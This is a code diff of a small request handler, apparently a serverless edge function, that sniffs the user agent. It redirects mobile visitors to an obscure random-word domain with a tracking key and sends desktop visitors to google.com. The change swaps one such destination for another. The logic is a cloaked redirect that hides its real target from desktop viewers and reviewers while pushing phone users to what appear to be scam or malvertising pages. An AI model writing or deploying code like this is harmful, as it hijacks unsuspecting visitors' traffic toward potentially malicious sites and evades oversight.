@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://colinsidewaychancy.com/gdg6se18?key=0d0651c115b61ec8ba6d4de3b9e72681", 302);
+    return Response.redirect("https://cookerygratecricket.com/eufd6nwnj?key=50aa5e8d48c1e5173af4f9b8690d015a", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
